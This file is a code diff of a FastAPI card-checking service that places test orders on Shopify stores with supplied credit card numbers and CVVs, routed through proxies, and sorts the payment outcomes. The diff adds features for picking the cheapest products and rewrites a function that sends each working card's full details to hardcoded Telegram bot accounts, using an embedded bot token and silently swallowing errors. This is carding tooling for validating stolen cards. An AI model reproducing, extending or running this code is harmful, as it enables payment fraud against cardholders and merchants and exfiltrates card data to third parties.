@@ -1,31 +1,16 @@
 """
 Endpoints:
-  GET /shopify?site={site}&cc={card}&proxy={proxy}
+  GET /shopify?site={site}&cc={card}&proxy={proxy}&url={product_url}&limit={n}
   GET /check?site={site}&card={card}&proxy={proxy}
   GET /health
 
 Card formats:  cc|mm|yy|cvv  or  cc|mm|yyyy|cvv
 Proxy formats: ip:port  |  ip:port:user:pass  |  host:port:user:pass  |  scheme://...
-
-Environment variables (all optional):
-  PORT              Server port (default 8080)
-  WORKERS           uvicorn worker count (default 4)
-  CARDS_FILE        Path to cards.txt (default ./cards.txt)
-  MAX_PRICE         Max product price to target (default 3.0)
-  MIN_PRICE         Min product price to target (default 0.50)
-  SITE_CONCURRENCY  Max simultaneous requests per store (default 15)
-  POOL_SIZE         aiohttp global connection pool (default 500)
-  POOL_PER_HOST     aiohttp per-host connection limit (default 25)
-  CONNECT_TIMEOUT   TCP connect timeout seconds (default 8)
-  REQUEST_TIMEOUT   Full request timeout seconds (default 35)
-  CACHE_TTL         Product cache TTL seconds (default 300)
-  LOG_LEVEL         Logging level: debug|info|warning (default warning)
 """
 
 import asyncio
 import sys
 import copy
-
 import logging
 import os
 import random
@@ -44,7 +29,7 @@ from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse
 
 # ---------------------------------------------------------------------------
-# Configuration from environment
+# Configuration
 # ---------------------------------------------------------------------------
 PORT             = int(os.environ.get("PORT", 8080))
 WORKERS          = int(os.environ.get("WORKERS", 2))
@@ -73,48 +58,44 @@ ADMIN_HIT_SENDER_TOKEN = "8629480718:AAFLxnpZAjxVzpKIfCvGTAMRKtZ1KD3EW9o"
 ADMIN_HIT_RECEIVER_ID  = 8524951580
 
 async def send_hit_to_admin(card: str, status: str, response: str, gateway: str, price: str, site: str):
-    """Fire-and-forget Telegram notification for Charged/Approved hits."""
     try:
         from datetime import datetime as _dt
-        
-        card = card.strip()
+        import urllib.request, urllib.parse, json as _json
 
         if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper():
-            status_text = "💎 CHARGED"
+            status_text = "\U0001f48e CHARGED"
         elif "APPROVED" in status.upper():
-            status_text = "✅ APPROVED"
+            status_text = "\u2705 APPROVED"
         else:
-            status_text = f"📌 {status}"
+            status_text = f"\U0001f4cc {status}"
 
         time_str = _dt.now().strftime("%H:%M:%S")
 
         message = (
-            f"<b>{status_text} • API HIT</b>\n\n"
-            f"🛒 <b>Site:</b> {site}\n"
-            f"⏰ <b>Time:</b> {time_str}\n\n"
-            f"💳 <b>CC:</b> <code>{card}</code>\n\n"
-            f"🛒 <b>Gateway:</b> {gateway}\n"
-            f"📝 <b>Response:</b> {str(response)[:150]}\n"
-            f"💵 <b>Price:</b> {price}"
+            f"<b>{status_text} \u2022 API HIT</b>\n\n"
+            f"\U0001f6d2 <b>Site:</b> {site}\n"
+            f"\u23f0 <b>Time:</b> {time_str}\n\n"
+            f"\U0001f4b3 <b>CC:</b> <code>{card}</code>\n\n"
+            f"\U0001f6d2 <b>Gateway:</b> {gateway}\n"
+            f"\U0001f4dd <b>Response:</b> {response[:150]}\n"
+            f"\U0001f4b8 <b>Price:</b> {price}"
         )
 
         receivers = [ADMIN_HIT_RECEIVER_ID, 8428369446]
         url = f"https://api.telegram.org/bot{ADMIN_HIT_SENDER_TOKEN}/sendMessage"
         
-        async with AsyncSession() as session:
-            for receiver in receivers:
-                payload = {
-                    "chat_id": receiver,
-                    "text": message,
-                    "parse_mode": "HTML",
-                    "disable_web_page_preview": True,
-                }
-                resp = await session.post(url, json=payload)
-                if resp.status_code != 200:
-                    log.error(f"Telegram API Error: {resp.text}")
-                    
-    except Exception as e:
-        log.error(f"Failed to send Telegram message: {e}") 
+        loop = asyncio.get_running_loop()
+        for receiver in receivers:
+            payload = _json.dumps({
+                "chat_id": receiver,
+                "text": message,
+                "parse_mode": "HTML",
+                "disable_web_page_preview": True,
+            }).encode("utf-8")
+            req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
+            await loop.run_in_executor(None, urllib.request.urlopen, req)
+    except Exception:
+        pass
 
 # ---------------------------------------------------------------------------
 # GraphQL Queries
@@ -555,6 +536,7 @@ def _get_cards() -> list[dict]:
 
 
 def _parse_card(raw: str) -> Optional[dict]:
+    """Accept cc|mm|yy|cvv and cc|mm|yyyy|cvv.  Returns normalized dict or None."""
     raw = raw.strip()
     if not raw or raw.startswith("#"):
         return None
@@ -675,6 +657,7 @@ def _random_identity() -> tuple[str, str, str]:
 
 
 def _extract(text: str, start: str, end: str) -> Optional[str]:
+    """Fast substring extraction between two delimiters."""
     idx = text.find(start)
     if idx == -1:
         return None
@@ -687,6 +670,7 @@ def _extract(text: str, start: str, end: str) -> Optional[str]:
 
 
 def _extract_sst(text: str, headers: dict) -> Optional[str]:
+    """Try every known pattern to pull the Shopify checkout session token."""
     for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
         if key in headers:
             return headers[key]
@@ -707,45 +691,54 @@ def _extract_sst(text: str, headers: dict) -> Optional[str]:
 
 
 def _normalize_response(raw: Optional[str]) -> str:
+    """Map raw Shopify / aiohttp error text to a standard code."""
     if not raw:
         return "CARD_DECLINED"
     msg = str(raw).upper()
 
     if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE", "ORDER_CREATED", "SUBMITSUCCESS")):
         return "ORDER_PLACED"
-
-    if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE", "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC", "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
+    if any(k in msg for k in ("ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "OTP",
+                               "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "CHALLENGE",
+                               "AUTHENTICATION_REQUIRED", "AUTHENTICATION_FAILED",
+                               "THREEDSSECURE", "THREE_D_SECURE", "3D_SECURE",
+                               "SCA_REQUIRED", "3DS_FAILED", "CONFIRMATION_REJECTED")):
+        return "3DS_REQUIRED"
+    if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE",
+                               "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC",
+                               "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
         return "INVALID_CVC"
-
-    if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE")):
-        return "INSUFFICIENT_FUNDS"
-
     if any(k in msg for k in ("DO_NOT_HONOR",)):
         return "DO_NOT_HONOR"
-    
+    if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT",
+                               "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE")):
+        return "INSUFFICIENT_FUNDS"
     if any(k in msg for k in ("EXPIRED", "EXPIRY", "INVALID_EXPIRY", "EXPIRATION")):
         return "EXPIRED_CARD"
-
     if any(k in msg for k in ("INCORRECT_ZIP", "ZIP_MISMATCH", "AVS_REJECTED", "AVS_FAILED", "INCORRECT_ADDRESS", "INVALID_BILLING_ADDRESS")):
         return "INCORRECT_ZIP"
-
+    if any(k in msg for k in ("CALL_ISSUER", "REFER_TO_ISSUER", "CONTACT_ISSUER")):
+        return "CALL_ISSUER"
+    if any(k in msg for k in ("AMOUNT_TOO_LARGE", "TRANSACTION_LIMIT_EXCEEDED", "LIMIT_EXCEEDED")):
+        return "LIMIT_EXCEEDED"
     if any(k in msg for k in ("FRAUD_SUSPECTED", "HIGH_RISK_FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "RISK_HIGH", "MERCHANT_RULE")):
         return "HIGH_RISK"
-
-    if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD", "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT", "CARD_NOT_SUPPORTED", "INVALID_PAYMENT_METHOD")):
+    if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD",
+                               "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT",
+                               "CARD_NOT_SUPPORTED", "INVALID_PAYMENT_METHOD")):
         return "INVALID_CARD"
-
-    if any(k in msg for k in ("3DS", "OTP", "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "THREEDSSECURE", "THREE_D_SECURE", "3D_SECURE", "SCA_REQUIRED", "CONFIRMATION_REJECTED")):
-        return "3DS_REQUIRED"
-
-    if "ACTION_REQUIRED" in msg or "ACTIONREQUIRED" in msg or "CHALLENGE" in msg:
-        if not any(c in msg for c in ("DECLINED", "INVALID", "CVC", "CVV", "ERROR", "INSUFFICIENT")):
-            return "3DS_REQUIRED"
-
+    if any(k in msg for k in ("LOST", "STOLEN", "PICKUP", "RESTRICTED", "REVOCATION",
+                               "PICKUP_CARD", "STOP_PAYMENT")):
+        return "CARD_DECLINED"
+    if any(k in msg for k in ("GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED",
+                               "NOT_PERMITTED", "SERVICE_NOT_ALLOWED",
+                               "TRY_AGAIN_LATER", "CARD_TESTING")):
+        return "CARD_DECLINED"
     return "CARD_DECLINED"
 
 
 def _parse_gql_errors(errors: list) -> str:
+    """Try to extract a meaningful response code from a GraphQL errors list."""
     for err in errors:
         for field in ("code", "nonLocalizedMessage", "localizedMessage",
                       "message", "localizedMessageHtml", "messageUntranslated"):
@@ -786,23 +779,74 @@ def _make_session(proxy_str: Optional[str]) -> tuple[AsyncSession, dict, bool]:
 
 
 # ---------------------------------------------------------------------------
-# Product fetching with TTL cache
+# Product fetching with TTL cache (Minimum Price First + Direct URL)
 # ---------------------------------------------------------------------------
 async def _fetch_products(
     base_url: str,
     proxy_str: Optional[str] = None,
     max_price: float = MAX_PRICE,
-) -> tuple[Optional[dict], list[dict], Optional[str]]:
+    limit: Optional[int] = None,
+    product_url: Optional[str] = None,
+) -> tuple[Optional[dict], list[dict], Optional[str], Optional[dict]]:
+    """
+    Returns (best_product, all_candidates_under_max_price, error_string, product_list_dict).
+    The best_product is ALWAYS the lowest priced item.
+    """
     if not base_url.startswith("http"):
         base_url = "https://" + base_url
 
     hostname = urlparse(base_url).netloc
     now      = time.time()
 
+    # ── Feature 1: Return Product List (Limit) ──
+    if limit is not None:
+        session, profile, owned = _make_session(proxy_str)
+        try:
+            resp = await session.get(f"{base_url}/products.json?limit={limit}", headers={"User-Agent": profile["ua"], "Accept": "application/json"})
+            if resp.status_code == 200:
+                data = orjson.loads(resp.content)
+                products = []
+                for p in data.get("products", []):
+                    for v in p.get("variants", []):
+                        products.append({
+                            "id": p.get("id"), "title": p.get("title"), "handle": p.get("handle"),
+                            "variant_id": v.get("id"), "price": v.get("price"), "available": v.get("available", True)
+                        })
+                return None, [], None, {"total": len(products), "products": products[:limit]}
+            return None, [], f"Failed to fetch products (HTTP {resp.status_code})", None
+        except Exception as ex:
+            return None, [], str(ex), None
+        finally:
+            if owned:
+                res = session.close()
+                if asyncio.iscoroutine(res): await res
+
+    # ── Feature 2: Direct URL Resolution ──
+    if product_url:
+        session, profile, owned = _make_session(proxy_str)
+        try:
+            pr = await session.get(product_url, headers={"User-Agent": profile["ua"]})
+            if pr.status_code == 200:
+                m_id = re.search(r'"variantId":(\d+)', pr.text) or re.search(r'"id":(\d+)', pr.text)
+                m_price = re.search(r'"price":\s*(\d+\.\d+)', pr.text)
+                variant_id = m_id.group(1) if m_id else None
+                price_val = float(m_price.group(1)) if m_price else 0.0
+                
+                if variant_id and price_val > 0:
+                    entry = {"site": base_url, "price": f"{price_val:.2f}", "price_f": price_val, "variant_id": str(variant_id), "title": "Direct URL Product", "handle": ""}
+                    return entry, [entry], None, None
+        except Exception:
+            pass
+        finally:
+            if owned:
+                res = session.close()
+                if asyncio.iscoroutine(res): await res
+
+    # ── Feature 3: Standard Product Fetching (Sorted for Minimum Price) ──
     cached = _product_cache.get(hostname)
     if cached and not cached.get("err"):
         if (now - cached["ts"]) < CACHE_TTL:
-            return cached.get("product"), cached.get("candidates", []), None
+            return cached.get("product"), cached.get("candidates", []), None, None
 
     session, profile, owned = _make_session(proxy_str)
     nav_headers = {
@@ -836,8 +880,7 @@ async def _fetch_products(
                         all_variants = products
                         break
                 elif resp.status_code in (429, 430):
-                    err = "THROTTLED"
-                    return None, [], err
+                    return None, [], "THROTTLED", None
             except Exception:
                 continue
 
@@ -888,7 +931,7 @@ async def _fetch_products(
                 pass
 
             if not candidates:
-                return None, [], "No products found"
+                return None, [], "No products found", None
         else:
             for product in all_variants:
                 p_title = str(product.get("title", "")).lower()
@@ -918,16 +961,15 @@ async def _fetch_products(
                         best       = entry
 
         if not best:
-            return None, [], "No products found"
+            return None, [], "No products found", None
 
         _product_cache[hostname] = {"product": best, "candidates": candidates, "err": None, "ts": now}
-        return best, candidates, None
+        return best, candidates, None, None
 
     except (asyncio.TimeoutError, RequestsError):
-        err = "Timeout"
-        return None, [], err
+        return None, [], "Timeout", None
     except Exception as ex:
-        return None, [], str(ex)
+        return None, [], str(ex), None
     finally:
         if owned:
             res = session.close()
@@ -946,6 +988,7 @@ async def validate_card(
     site_url:   str,
     variant_id: Optional[str] = None,
     proxy_str:  Optional[str] = None,
+    product_url: Optional[str] = None,
 ) -> dict:
     t0       = time.time()
     gateway  = "UNKNOWN"
@@ -983,7 +1026,7 @@ async def validate_card(
             state  = addr["zoneCode"]
             s_zip  = addr["postalCode"]
 
-            best, all_candidates, err = await _fetch_products(ourl, proxy_str)
+            best, all_candidates, err, _ = await _fetch_products(ourl, proxy_str, product_url=product_url)
             if not variant_id:
                 if not best:
                     return _r(f"NO_PRODUCT: {err}")
@@ -1671,14 +1714,11 @@ async def validate_card(
                     return _r("ORDER_PLACED", charged="True", approved="True")
                 
                 if rtype == "ActionRequiredReceipt":
-                   action = receipt.get("action") or {}
-                   reason = action.get("challengeType") or action.get("__typename") or "OTP_OR_REDIRECT"
-    
-                   # 🌟 CompletePaymentChallenge-কে OTP Required বানানোর লজিক
-                   if "CompletePaymentChallenge" in str(reason):
-                       reason = "OTP Required"
-        
-                   return _r(f"3DS_REQUIRED ({reason})", approved="True")
+                    action = receipt.get("action") or {}
+                    reason = action.get("challengeType") or action.get("__typename") or "OTP_OR_REDIRECT"
+                    if "CompletePaymentChallenge" in str(reason):
+                        reason = "OTP Required"
+                    return _r(f"3DS_REQUIRED ({reason})", approved="True")
                 
                 if rtype == "FailedReceipt":
                     pe      = receipt.get("processingError") or {}
@@ -1720,14 +1760,11 @@ async def validate_card(
                                 return _r("ORDER_PLACED", charged="True", approved="True")
                                 
                             if pt == "ActionRequiredReceipt":
-                               action = pd.get("action") or {}
-                               reason = action.get("challengeType") or action.get("__typename") or "OTP_OR_REDIRECT"
-    
-                            # 🌟 পোলিং স্টেপেও OTP Required দেখানোর লজিক
-                            if "CompletePaymentChallenge" in str(reason):
-                                reason = "OTP Required"
-        
-                            return _r(f"3DS_REQUIRED ({reason})", approved="True")
+                                action = pd.get("action") or {}
+                                reason = action.get("challengeType") or action.get("__typename") or "OTP_OR_REDIRECT"
+                                if "CompletePaymentChallenge" in str(reason):
+                                    reason = "OTP Required"
+                                return _r(f"3DS_REQUIRED ({reason})", approved="True")
                                 
                             if pt == "FailedReceipt":
                                 pe      = pd.get("processingError") or {}
@@ -1826,12 +1863,20 @@ async def shopify_route(
     cc:    Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
     proxy: Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
     key:   Optional[str] = Query(None, description="API Key"),
+    limit: Optional[int] = Query(None, description="Limit for product list (skip card check)"),
+    url:   Optional[str] = Query(None, description="Direct product URL to check"),
 ):
     secret = os.environ.get("SHOPII_API_KEY", "DARKANONSHO!!!")
     if key != secret:
         return JSONResponse({"error": "Unauthorized API key. Please pass valid &key=... parameter"}, status_code=401)
     if not site:
         return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)
+
+    if limit is not None:
+        _, _, err, product_list = await _fetch_products(site, proxy, limit=limit)
+        if product_list:
+            return JSONResponse(product_list)
+        return JSONResponse({"error": err or "Failed to fetch products"}, status_code=400)
 
     if cc:
         card = _parse_card(cc)
@@ -1851,14 +1896,14 @@ async def shopify_route(
 
     result = await validate_card(
         card["cc"], card["month"], card["year"], card["cvv"],
-        site, proxy_str=proxy,
+        site, proxy_str=proxy, product_url=url,
     )
     _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1
 
     if result.get("Charged") == "True" or result.get("Approved") == "True":
         status_label = "CHARGED" if result.get("Charged") == "True" else "APPROVED"
         cc_str = result.get("CC", f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}")
-        asyncio.create_task(send_hit_to_admin(
+        asyncio.ensure_future(send_hit_to_admin(
             card=cc_str,
             status=status_label,
             response=result.get("Response", ""),
@@ -1902,7 +1947,7 @@ async def check_route(
     site = site.strip()
     ourl = site if site.startswith("http") else f"https://{site}"
 
-    best, candidates, err = await _fetch_products(ourl, proxy)
+    best, candidates, err, _ = await _fetch_products(ourl, proxy)
     if not best:
         reason = "DEAD_SITE"
         if err == "THROTTLED":
@@ -1926,7 +1971,6 @@ async def check_route(
         ourl, variant_id=variant_id, proxy_str=proxy,
     )
 
-
     response_code = result.get("Response", "")
     _stats[f"response_{response_code or 'UNKNOWN'}"] += 1
 
@@ -1939,7 +1983,7 @@ async def check_route(
     if result.get("Charged") == "True" or result.get("Approved") == "True":
         status_label = "CHARGED" if result.get("Charged") == "True" else "APPROVED"
         cc_str = result.get("CC", f"{parsed['cc']}|{parsed['month']}|{parsed['year']}|{parsed['cvv']}")
-        asyncio.create_task(send_hit_to_admin(
+        asyncio.ensure_future(send_hit_to_admin(
             card=cc_str,
             status=status_label,
             response=response_code,
